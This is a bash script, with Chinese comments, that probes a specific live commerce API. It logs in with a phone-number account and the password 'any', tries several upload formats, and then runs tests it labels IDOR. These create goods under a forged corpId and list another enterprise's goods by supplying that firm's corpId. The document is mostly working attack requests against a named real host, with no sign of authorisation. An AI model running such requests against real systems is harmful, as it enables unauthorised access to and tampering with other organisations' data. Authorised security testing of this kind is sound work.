#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

echo "====== 上传测试 - typeMap详细格式探索 ======"

# 测试1: typeMap作为JSON字符串
echo ""
echo "--- 测试1: typeMap作为JSON字符串 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/test.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeMap={"type":"1"}' 2>&1

# 测试2: typeMap作为JSON数组字符串
echo ""
echo "--- 测试2: typeMap JSON数组字符串 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/test.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeMap={"typeList":["1"]}' 2>&1

# 测试3: typeMap作为JSON数组字符串
echo ""
echo "--- 测试3: typeMap嵌套JSON ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/test.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeMap={"list":[{"type":"1"}]}' 2>&1

# ===== IDOR测试 =====
echo ""
echo "====== IDOR测试 ======"

# 测试4: 尝试修改其他企业 - 修改corpId
echo ""
echo "--- 测试4: 创建商品时修改corpId ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST003","goodsName":"测试商品IDOR","firstUnit":"035","dclUnit":"035","codeTs":"0101210010","goodsModel":"0:品牌类型|1:出口享惠情况","regulatoryCondition":"AFEB","tradeBan":"出口","ciqType":"P/Q","operationType":"1","currency":"142","corpId":"fakecorp123"}' 2>&1

# 测试5: 尝试获取其他企业商品列表
echo ""
echo "--- 测试5: 通过corpId参数获取其他企业 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"corpId":"01M0HQN8YCMNEVGY5VK0M9KSG4"}' 2>&1 | python3 -c "
import sys,json; d=json.load(sys.stdin); print(f'code={d.get(\"code\")} total={d.get(\"total\")}')"